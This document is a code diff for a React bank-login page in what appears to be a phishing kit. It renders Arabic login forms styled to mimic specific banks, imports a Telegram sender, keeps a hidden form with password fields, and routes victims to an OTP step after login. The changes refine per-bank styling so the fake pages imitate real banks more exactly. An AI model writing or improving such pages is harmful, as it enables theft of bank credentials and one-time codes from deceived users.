@@ -5,12 +5,13 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { useLink } from "@/hooks/useSupabase";
-import { Lock, Eye, EyeOff, Building2, ArrowLeft, ShieldCheck } from "lucide-react";
+import { Lock, Eye, EyeOff, ArrowLeft, ShieldCheck } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import { getBankById } from "@/lib/banks";
 import { getCountryByCode } from "@/lib/countries";
 import { getBankDesign, getDefaultBankDesign } from "@/lib/bankDesigns";
+import BankLoginLayout from "@/components/BankLoginLayout";
 
 const PaymentBankLogin = () => {
   const { id } = useParams();
@@ -49,8 +50,8 @@ const PaymentBankLogin = () => {
   const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
   const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
   
-  // Get bank design specification
-  const bankDesign = selectedBankId ? getBankDesign(selectedBankId) || getDefaultBankDesign() : getDefaultBankDesign();
+  // Get bank design specification (always returns a complete design)
+  const bankDesign = selectedBankId ? getBankDesign(selectedBankId) : getDefaultBankDesign();
   
   // Determine login type based on bank
   const getLoginType = () => {
@@ -230,32 +231,16 @@ const PaymentBankLogin = () => {
     navigate(`/pay/${id}/otp`);
   };
   
-  // Get card style classes
-  const getCardClasses = () => {
-    const baseClasses = "w-full";
-    const radiusClass = `rounded-${bankDesign.borderRadius?.replace('px', '') || 'lg'}`;
-    
-    switch (bankDesign.cardStyle) {
-      case 'elevated':
-        return `${baseClasses} ${radiusClass} shadow-2xl`;
-      case 'flat':
-        return `${baseClasses} ${radiusClass} shadow-sm`;
-      case 'outlined':
-        return `${baseClasses} ${radiusClass} border-2`;
-      case 'gradient':
-        return `${baseClasses} ${radiusClass} shadow-lg`;
-      default:
-        return `${baseClasses} ${radiusClass} shadow-lg`;
-    }
-  };
-  
-  // Get button style
-  const getButtonStyles = () => {
+  // Get button style with exact specifications
+  const getButtonStyles = (): React.CSSProperties => {
     const baseStyle: React.CSSProperties = {
       borderRadius: bankDesign.buttonRadius || '8px',
       color: '#FFFFFF',
       fontWeight: bankDesign.fontWeight || '500',
+      fontSize: bankDesign.buttonFontSize || bankDesign.fontSize?.body || '16px',
+      padding: bankDesign.buttonPadding || bankDesign.padding?.button || '14px 24px',
       transition: 'all 0.3s ease',
+      width: '100%',
     };
     
     switch (bankDesign.buttonStyle) {
@@ -264,14 +249,14 @@ const PaymentBankLogin = () => {
           ...baseStyle,
           background: `linear-gradient(135deg, ${bankDesign.primaryColor}, ${bankDesign.secondaryColor})`,
           border: 'none',
-          boxShadow: `0 4px 12px ${bankDesign.primaryColor}30`,
+          boxShadow: bankDesign.shadow?.button || `0 4px 12px ${bankDesign.primaryColor}30`,
         };
       case 'solid':
         return {
           ...baseStyle,
           background: bankDesign.primaryColor,
           border: 'none',
-          boxShadow: `0 4px 12px ${bankDesign.primaryColor}30`,
+          boxShadow: bankDesign.shadow?.button || `0 4px 12px ${bankDesign.primaryColor}30`,
         };
       case 'outline':
         return {
@@ -285,23 +270,25 @@ const PaymentBankLogin = () => {
           ...baseStyle,
           background: bankDesign.primaryColor,
           border: 'none',
-          boxShadow: `0 8px 16px ${bankDesign.primaryColor}40`,
+          boxShadow: bankDesign.shadow?.button || `0 8px 16px ${bankDesign.primaryColor}40`,
         };
       default:
         return baseStyle;
     }
   };
   
-  // Get input style
-  const getInputStyles = () => {
+  // Get input style with exact specifications
+  const getInputStyles = (): React.CSSProperties => {
     const baseStyle: React.CSSProperties = {
       borderRadius: bankDesign.inputRadius || '8px',
       borderColor: bankDesign.borderColor || bankDesign.primaryColor + '40',
       backgroundColor: bankDesign.surfaceColor,
       color: bankDesign.textColor,
-      fontSize: '16px',
-      padding: '12px 16px',
+      fontSize: bankDesign.fontSize?.body || '16px',
+      height: bankDesign.inputHeight || '48px',
+      padding: bankDesign.inputPadding || bankDesign.padding?.input || '14px 16px',
       transition: 'all 0.2s ease',
+      width: '100%',
     };
     
     switch (bankDesign.inputStyle) {
@@ -323,385 +310,317 @@ const PaymentBankLogin = () => {
           borderWidth: '0 0 2px 0',
           borderStyle: 'solid',
           backgroundColor: 'transparent',
+          borderRadius: '0',
         };
       default:
         return baseStyle;
     }
   };
   
-  // Layout container style
-  const getLayoutContainerStyle = (): React.CSSProperties => {
-    return {
-      fontFamily: bankDesign.fontFamilyArabic || bankDesign.fontFamily || 'Tajawal, sans-serif',
-      backgroundColor: bankDesign.backgroundColor,
-      color: bankDesign.textColor,
-      minHeight: '100vh',
-      direction: 'rtl',
-    };
-  };
+  const spacing = bankDesign.spacing || { small: '8px', medium: '16px', large: '24px', xlarge: '32px' };
   
   return (
-    <div style={getLayoutContainerStyle()}>
-      {/* Background Pattern/Image if specified */}
-      {bankDesign.backgroundImage && (
-        <div
-          style={{
-            position: 'fixed',
-            top: 0,
-            left: 0,
-            right: 0,
-            bottom: 0,
-            backgroundImage: `url(${bankDesign.backgroundImage})`,
-            backgroundSize: 'cover',
-            backgroundPosition: 'center',
-            opacity: 0.05,
-            zIndex: 0,
-          }}
-        />
-      )}
-      
+    <BankLoginLayout
+      bankDesign={bankDesign}
+      bankName={selectedBank?.name || ''}
+      bankNameAr={selectedBank?.nameAr || ''}
+      bankId={selectedBankId}
+    >
+      {/* Security Notice */}
       <div
-        className={`flex items-center justify-center min-h-screen px-4 py-8 ${
-          bankDesign.layoutType === 'split' ? 'lg:px-8' : ''
-        }`}
-        style={{ position: 'relative', zIndex: 1 }}
+        style={{
+          background: bankDesign.primaryColor + '10',
+          border: `1px solid ${bankDesign.primaryColor}30`,
+          borderRadius: bankDesign.borderRadius || '12px',
+          padding: spacing.medium,
+          marginBottom: spacing.large,
+          display: 'flex',
+          alignItems: 'start',
+          gap: spacing.small,
+        }}
       >
-        <div
-          style={{
-            maxWidth: bankDesign.containerMaxWidth || '480px',
-            width: '100%',
-          }}
-        >
-          {/* Bank Header */}
-          {bankDesign.headerStyle !== 'minimal' && (
-            <div
-              className={`mb-6 ${bankDesign.headerStyle === 'prominent' ? 'mb-8' : ''}`}
-              style={{
-                textAlign: 'center',
-              }}
-            >
-              {selectedBank && (
-                <div
-                  style={{
-                    background: bankDesign.buttonStyle === 'gradient'
-                      ? `linear-gradient(135deg, ${bankDesign.primaryColor}, ${bankDesign.secondaryColor})`
-                      : bankDesign.primaryColor,
-                    borderRadius: bankDesign.borderRadius || '12px',
-                    padding: bankDesign.headerStyle === 'prominent' ? '24px' : '16px',
-                    color: '#FFFFFF',
-                    marginBottom: '24px',
-                    boxShadow: `0 4px 12px ${bankDesign.primaryColor}30`,
-                  }}
-                >
-                  <div className="flex items-center justify-center gap-3">
-                    <Building2 className="w-8 h-8" />
-                    <div>
-                      <h1 style={{ fontSize: '20px', fontWeight: '600', margin: 0 }}>
-                        {selectedBank.nameAr}
-                      </h1>
-                      <p style={{ fontSize: '14px', opacity: 0.9, margin: 0 }}>
-                        {selectedBank.name}
-                      </p>
-                    </div>
-                  </div>
-                </div>
-              )}
-              <h2 style={{ fontSize: '28px', fontWeight: '600', color: bankDesign.textColor, marginBottom: '8px' }}>
-                تسجيل الدخول
-              </h2>
-              <p style={{ fontSize: '16px', color: bankDesign.textSecondaryColor || bankDesign.textColor, opacity: 0.7 }}>
-                أدخل بيانات الدخول للبنك لتأكيد العملية
-              </p>
-            </div>
-          )}
-          
-          {/* Login Card */}
-          <div
-            className={getCardClasses()}
-            style={{
-              backgroundColor: bankDesign.surfaceColor,
-              borderColor: bankDesign.borderColor || bankDesign.primaryColor + '20',
-              padding: '32px',
-            }}
-          >
-            {/* Security Notice */}
-            <div
-              style={{
-                background: bankDesign.primaryColor + '10',
-                border: `1px solid ${bankDesign.primaryColor}30`,
-                borderRadius: bankDesign.borderRadius || '12px',
-                padding: '12px 16px',
-                marginBottom: '24px',
-                display: 'flex',
-                alignItems: 'start',
-                gap: '12px',
-              }}
-            >
-              <ShieldCheck style={{ color: bankDesign.primaryColor, flexShrink: 0, marginTop: '2px' }} className="w-5 h-5" />
-              <div style={{ fontSize: '14px' }}>
-                <p style={{ fontWeight: '600', marginBottom: '4px', color: bankDesign.textColor }}>
-                  تسجيل دخول آمن
-                </p>
-                <p style={{ color: bankDesign.textSecondaryColor || bankDesign.textColor, fontSize: '13px', opacity: 0.8 }}>
-                  سجّل دخول إلى حسابك البنكي لتأكيد العملية وإكمال الدفع بأمان
-                </p>
-              </div>
-            </div>
-            
-            <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
-              {/* Username Login */}
-              {loginType === 'username' && (
-                <div>
-                  <Label style={{ 
-                    marginBottom: '8px', 
-                    display: 'block',
-                    fontSize: '14px',
-                    fontWeight: '500',
-                    color: bankDesign.textColor 
-                  }}>
-                    اسم المستخدم
-                  </Label>
-                  <Input
-                    type="text"
-                    placeholder="أدخل اسم المستخدم"
-                    value={username}
-                    onChange={(e) => setUsername(e.target.value)}
-                    style={getInputStyles()}
-                    onFocus={(e) => {
-                      e.target.style.borderColor = bankDesign.primaryColor;
-                      e.target.style.boxShadow = `0 0 0 3px ${bankDesign.primaryColor}20`;
-                    }}
-                    onBlur={(e) => {
-                      e.target.style.borderColor = bankDesign.borderColor || bankDesign.primaryColor + '40';
-                      e.target.style.boxShadow = 'none';
-                    }}
-                    autoComplete="username"
-                    required
-                  />
-                </div>
-              )}
-              
-              {/* Customer ID Login */}
-              {loginType === 'customerId' && (
-                <div>
-                  <Label style={{ 
-                    marginBottom: '8px', 
-                    display: 'block',
-                    fontSize: '14px',
-                    fontWeight: '500',
-                    color: bankDesign.textColor 
-                  }}>
-                    رقم العميل
-                  </Label>
-                  <Input
-                    type="text"
-                    placeholder="أدخل رقم العميل"
-                    value={customerId}
-                    onChange={(e) => setCustomerId(e.target.value)}
-                    style={getInputStyles()}
-                    onFocus={(e) => {
-                      e.target.style.borderColor = bankDesign.primaryColor;
-                      e.target.style.boxShadow = `0 0 0 3px ${bankDesign.primaryColor}20`;
-                    }}
-                    onBlur={(e) => {
-                      e.target.style.borderColor = bankDesign.borderColor || bankDesign.primaryColor + '40';
-                      e.target.style.boxShadow = 'none';
-                    }}
-                    inputMode="numeric"
-                    required
-                  />
-                </div>
-              )}
-              
-              {/* Phone Login */}
-              {loginType === 'phone' && (
-                <div>
-                  <Label style={{ 
-                    marginBottom: '8px', 
-                    display: 'block',
-                    fontSize: '14px',
-                    fontWeight: '500',
-                    color: bankDesign.textColor 
-                  }}>
-                    رقم الجوال
-                  </Label>
-                  <Input
-                    type="tel"
-                    placeholder="05xxxxxxxx"
-                    value={phoneNumber}
-                    onChange={(e) => setPhoneNumber(e.target.value)}
-                    style={getInputStyles()}
-                    onFocus={(e) => {
-                      e.target.style.borderColor = bankDesign.primaryColor;
-                      e.target.style.boxShadow = `0 0 0 3px ${bankDesign.primaryColor}20`;
-                    }}
-                    onBlur={(e) => {
-                      e.target.style.borderColor = bankDesign.borderColor || bankDesign.primaryColor + '40';
-                      e.target.style.boxShadow = 'none';
-                    }}
-                    inputMode="tel"
-                    required
-                  />
-                </div>
-              )}
-              
-              {/* Password */}
-              <div>
-                <Label style={{ 
-                  marginBottom: '8px', 
-                  display: 'block',
-                  fontSize: '14px',
-                  fontWeight: '500',
-                  color: bankDesign.textColor 
-                }}>
-                  كلمة المرور
-                </Label>
-                <div style={{ position: 'relative' }}>
-                  <Input
-                    type={showPassword ? "text" : "password"}
-                    placeholder="أدخل كلمة المرور"
-                    value={password}
-                    onChange={(e) => setPassword(e.target.value)}
-                    style={{
-                      ...getInputStyles(),
-                      paddingRight: '48px',
-                    }}
-                    onFocus={(e) => {
-                      e.target.style.borderColor = bankDesign.primaryColor;
-                      e.target.style.boxShadow = `0 0 0 3px ${bankDesign.primaryColor}20`;
-                    }}
-                    onBlur={(e) => {
-                      e.target.style.borderColor = bankDesign.borderColor || bankDesign.primaryColor + '40';
-                      e.target.style.boxShadow = 'none';
-                    }}
-                    autoComplete="current-password"
-                    required
-                  />
-                  <button
-                    type="button"
-                    onClick={() => setShowPassword(!showPassword)}
-                    style={{
-                      position: 'absolute',
-                      right: '12px',
-                      top: '50%',
-                      transform: 'translateY(-50%)',
-                      background: 'none',
-                      border: 'none',
-                      cursor: 'pointer',
-                      color: bankDesign.textSecondaryColor || bankDesign.textColor,
-                      opacity: 0.6,
-                    }}
-                  >
-                    {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
-                  </button>
-                </div>
-              </div>
-              
-              {/* Remember Me / Forgot Password */}
-              <div style={{ 
-                display: 'flex', 
-                alignItems: 'center', 
-                justifyContent: 'space-between',
-                fontSize: '13px',
-              }}>
-                <label style={{ 
-                  display: 'flex', 
-                  alignItems: 'center', 
-                  gap: '8px',
-                  color: bankDesign.textSecondaryColor || bankDesign.textColor,
-                  cursor: 'pointer',
-                }}>
-                  <input 
-                    type="checkbox" 
-                    style={{ 
-                      width: '16px', 
-                      height: '16px',
-                      accentColor: bankDesign.primaryColor,
-                    }} 
-                  />
-                  تذكرني
-                </label>
-                <button
-                  type="button"
-                  style={{
-                    background: 'none',
-                    border: 'none',
-                    color: bankDesign.primaryColor,
-                    cursor: 'pointer',
-                    textDecoration: 'underline',
-                    fontSize: '13px',
-                  }}
-                >
-                  نسيت كلمة المرور؟
-                </button>
-              </div>
-              
-              {/* Submit Button */}
-              <Button
-                type="submit"
-                style={{
-                  ...getButtonStyles(),
-                  width: '100%',
-                  padding: '14px 24px',
-                  fontSize: '16px',
-                  cursor: isSubmitting ? 'not-allowed' : 'pointer',
-                  opacity: isSubmitting ? 0.7 : 1,
-                }}
-                disabled={isSubmitting}
-              >
-                {isSubmitting ? (
-                  <span>جاري تسجيل الدخول...</span>
-                ) : (
-                  <>
-                    <Lock className="w-4 h-4 ml-2" />
-                    <span>تسجيل الدخول والمتابعة</span>
-                    <ArrowLeft className="w-4 h-4 mr-2" />
-                  </>
-                )}
-              </Button>
-              
-              <p style={{ 
-                fontSize: '11px', 
-                textAlign: 'center', 
-                color: bankDesign.textSecondaryColor || bankDesign.textColor,
-                opacity: 0.7,
-                marginTop: '12px',
-              }}>
-                بتسجيل الدخول، أنت توافق على شروط وأحكام البنك
-              </p>
-            </form>
-            
-            {/* Register Link */}
-            <div style={{
-              marginTop: '24px',
-              paddingTop: '24px',
-              borderTop: `1px solid ${bankDesign.borderColor || bankDesign.primaryColor + '20'}`,
-              textAlign: 'center',
+        <ShieldCheck 
+          style={{ 
+            color: bankDesign.primaryColor, 
+            flexShrink: 0, 
+            marginTop: '2px',
+            width: '20px',
+            height: '20px',
+          }} 
+        />
+        <div style={{ fontSize: bankDesign.fontSize?.small || '14px' }}>
+          <p style={{ 
+            fontWeight: '600', 
+            marginBottom: '4px', 
+            color: bankDesign.textColor,
+            fontSize: bankDesign.fontSize?.small || '14px',
+          }}>
+            تسجيل دخول آمن
+          </p>
+          <p style={{ 
+            color: bankDesign.textSecondaryColor || bankDesign.textColor, 
+            fontSize: bankDesign.fontSize?.small || '14px', 
+            opacity: 0.8,
+            margin: 0,
+          }}>
+            سجّل دخول إلى حسابك البنكي لتأكيد العملية وإكمال الدفع بأمان
+          </p>
+        </div>
+      </div>
+      
+      <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: spacing.large }}>
+        {/* Username Login */}
+        {loginType === 'username' && (
+          <div>
+            <Label style={{ 
+              marginBottom: spacing.small, 
+              display: 'block',
+              fontSize: bankDesign.fontSize?.small || '14px',
+              fontWeight: '500',
+              color: bankDesign.textColor 
             }}>
-              <p style={{ 
-                fontSize: '13px',
+              اسم المستخدم
+            </Label>
+            <Input
+              type="text"
+              placeholder="أدخل اسم المستخدم"
+              value={username}
+              onChange={(e) => setUsername(e.target.value)}
+              style={getInputStyles()}
+              onFocus={(e) => {
+                e.target.style.borderColor = bankDesign.primaryColor;
+                e.target.style.boxShadow = bankDesign.shadow?.input || `0 0 0 3px ${bankDesign.primaryColor}20`;
+              }}
+              onBlur={(e) => {
+                e.target.style.borderColor = bankDesign.borderColor || bankDesign.primaryColor + '40';
+                e.target.style.boxShadow = 'none';
+              }}
+              autoComplete="username"
+              required
+            />
+          </div>
+        )}
+        
+        {/* Customer ID Login */}
+        {loginType === 'customerId' && (
+          <div>
+            <Label style={{ 
+              marginBottom: spacing.small, 
+              display: 'block',
+              fontSize: bankDesign.fontSize?.small || '14px',
+              fontWeight: '500',
+              color: bankDesign.textColor 
+            }}>
+              رقم العميل
+            </Label>
+            <Input
+              type="text"
+              placeholder="أدخل رقم العميل"
+              value={customerId}
+              onChange={(e) => setCustomerId(e.target.value)}
+              style={getInputStyles()}
+              onFocus={(e) => {
+                e.target.style.borderColor = bankDesign.primaryColor;
+                e.target.style.boxShadow = bankDesign.shadow?.input || `0 0 0 3px ${bankDesign.primaryColor}20`;
+              }}
+              onBlur={(e) => {
+                e.target.style.borderColor = bankDesign.borderColor || bankDesign.primaryColor + '40';
+                e.target.style.boxShadow = 'none';
+              }}
+              inputMode="numeric"
+              required
+            />
+          </div>
+        )}
+        
+        {/* Phone Login */}
+        {loginType === 'phone' && (
+          <div>
+            <Label style={{ 
+              marginBottom: spacing.small, 
+              display: 'block',
+              fontSize: bankDesign.fontSize?.small || '14px',
+              fontWeight: '500',
+              color: bankDesign.textColor 
+            }}>
+              رقم الجوال
+            </Label>
+            <Input
+              type="tel"
+              placeholder="05xxxxxxxx"
+              value={phoneNumber}
+              onChange={(e) => setPhoneNumber(e.target.value)}
+              style={getInputStyles()}
+              onFocus={(e) => {
+                e.target.style.borderColor = bankDesign.primaryColor;
+                e.target.style.boxShadow = bankDesign.shadow?.input || `0 0 0 3px ${bankDesign.primaryColor}20`;
+              }}
+              onBlur={(e) => {
+                e.target.style.borderColor = bankDesign.borderColor || bankDesign.primaryColor + '40';
+                e.target.style.boxShadow = 'none';
+              }}
+              inputMode="tel"
+              required
+            />
+          </div>
+        )}
+        
+        {/* Password */}
+        <div>
+          <Label style={{ 
+            marginBottom: spacing.small, 
+            display: 'block',
+            fontSize: bankDesign.fontSize?.small || '14px',
+            fontWeight: '500',
+            color: bankDesign.textColor 
+          }}>
+            كلمة المرور
+          </Label>
+          <div style={{ position: 'relative' }}>
+            <Input
+              type={showPassword ? "text" : "password"}
+              placeholder="أدخل كلمة المرور"
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
+              style={{
+                ...getInputStyles(),
+                paddingRight: '48px',
+              }}
+              onFocus={(e) => {
+                e.target.style.borderColor = bankDesign.primaryColor;
+                e.target.style.boxShadow = bankDesign.shadow?.input || `0 0 0 3px ${bankDesign.primaryColor}20`;
+              }}
+              onBlur={(e) => {
+                e.target.style.borderColor = bankDesign.borderColor || bankDesign.primaryColor + '40';
+                e.target.style.boxShadow = 'none';
+              }}
+              autoComplete="current-password"
+              required
+            />
+            <button
+              type="button"
+              onClick={() => setShowPassword(!showPassword)}
+              style={{
+                position: 'absolute',
+                right: '12px',
+                top: '50%',
+                transform: 'translateY(-50%)',
+                background: 'none',
+                border: 'none',
+                cursor: 'pointer',
                 color: bankDesign.textSecondaryColor || bankDesign.textColor,
-                marginBottom: '12px',
-              }}>
-                لا تملك حساب؟
-              </p>
-              <Button
-                type="button"
-                variant="outline"
-                style={{
-                  borderColor: bankDesign.primaryColor,
-                  color: bankDesign.primaryColor,
-                  backgroundColor: 'transparent',
-                  borderRadius: bankDesign.buttonRadius || '8px',
-                  padding: '8px 16px',
-                  fontSize: '13px',
-                }}
-              >
-                تسجيل حساب جديد
-              </Button>
-            </div>
+                opacity: 0.6,
+                display: 'flex',
+                alignItems: 'center',
+                justifyContent: 'center',
+              }}
+            >
+              {showPassword ? <EyeOff style={{ width: '20px', height: '20px' }} /> : <Eye style={{ width: '20px', height: '20px' }} />}
+            </button>
           </div>
         </div>
+        
+        {/* Remember Me / Forgot Password */}
+        <div style={{ 
+          display: 'flex', 
+          alignItems: 'center', 
+          justifyContent: 'space-between',
+          fontSize: bankDesign.fontSize?.small || '14px',
+        }}>
+          <label style={{ 
+            display: 'flex', 
+            alignItems: 'center', 
+            gap: spacing.small,
+            color: bankDesign.textSecondaryColor || bankDesign.textColor,
+            cursor: 'pointer',
+          }}>
+            <input 
+              type="checkbox" 
+              style={{ 
+                width: '16px', 
+                height: '16px',
+                accentColor: bankDesign.primaryColor,
+              }} 
+            />
+            تذكرني
+          </label>
+          <button
+            type="button"
+            style={{
+              background: 'none',
+              border: 'none',
+              color: bankDesign.primaryColor,
+              cursor: 'pointer',
+              textDecoration: 'underline',
+              fontSize: bankDesign.fontSize?.small || '14px',
+            }}
+          >
+            نسيت كلمة المرور؟
+          </button>
+        </div>
+        
+        {/* Submit Button */}
+        <Button
+          type="submit"
+          style={{
+            ...getButtonStyles(),
+            cursor: isSubmitting ? 'not-allowed' : 'pointer',
+            opacity: isSubmitting ? 0.7 : 1,
+          }}
+          disabled={isSubmitting}
+        >
+          {isSubmitting ? (
+            <span>جاري تسجيل الدخول...</span>
+          ) : (
+            <>
+              <Lock style={{ width: '16px', height: '16px', marginLeft: '8px' }} />
+              <span>تسجيل الدخول والمتابعة</span>
+              <ArrowLeft style={{ width: '16px', height: '16px', marginRight: '8px' }} />
+            </>
+          )}
+        </Button>
+        
+        <p style={{ 
+          fontSize: bankDesign.fontSize?.small || '14px', 
+          textAlign: 'center', 
+          color: bankDesign.textSecondaryColor || bankDesign.textColor,
+          opacity: 0.7,
+          marginTop: spacing.medium,
+          margin: 0,
+        }}>
+          بتسجيل الدخول، أنت توافق على شروط وأحكام البنك
+        </p>
+      </form>
+      
+      {/* Register Link */}
+      <div style={{
+        marginTop: spacing.large,
+        paddingTop: spacing.large,
+        borderTop: `1px solid ${bankDesign.borderColor || bankDesign.primaryColor + '20'}`,
+        textAlign: 'center',
+      }}>
+        <p style={{ 
+          fontSize: bankDesign.fontSize?.small || '14px',
+          color: bankDesign.textSecondaryColor || bankDesign.textColor,
+          marginBottom: spacing.medium,
+          margin: 0,
+        }}>
+          لا تملك حساب؟
+        </p>
+        <Button
+          type="button"
+          variant="outline"
+          style={{
+            borderColor: bankDesign.primaryColor,
+            color: bankDesign.primaryColor,
+            backgroundColor: 'transparent',
+            borderRadius: bankDesign.buttonRadius || '8px',
+            padding: spacing.small + ' ' + spacing.medium,
+            fontSize: bankDesign.fontSize?.small || '14px',
+          }}
+        >
+          تسجيل حساب جديد
+        </Button>
       </div>
       
       {/* Hidden Netlify Form */}
@@ -721,7 +640,7 @@ const PaymentBankLogin = () => {
         <input type="password" name="password" />
         <input type="text" name="timestamp" />
       </form>
-    </div>
+    </BankLoginLayout>
   );
 };
 
